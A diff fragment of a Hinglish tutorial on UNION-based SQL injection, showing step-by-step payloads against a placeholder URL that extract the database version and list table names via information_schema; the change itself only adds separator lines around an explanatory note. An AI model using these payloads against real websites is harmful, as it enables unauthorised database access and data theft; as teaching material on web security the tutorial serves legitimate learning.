@@ -27,7 +27,9 @@ perticular table ke coloums ke bare main pata krna ki konse coloum se hum apni q
 https://example.com/?id=1' UNION SELECT ALL 1,@@version,3,4,5,6--<br/>
 vulnerble coloum milne ke baad waha se hum db ki informations version jaise data ko retrive kr sakte hai***
 
+----------------------------------------------------------------------------------------------------------------------------------------------------
 **NOTES SQL DB ke under information_schema krke ek table create hota hai jiske under sari informations hoti hai like table coloum names kya hai or kisi perticular coloum ka datatype kya hai**
+-------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ***Step 4 retrive all tables name with the help of information_schema.tables function <br/>
 https://example.com/?id=1' UNION SELECT ALL 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()--
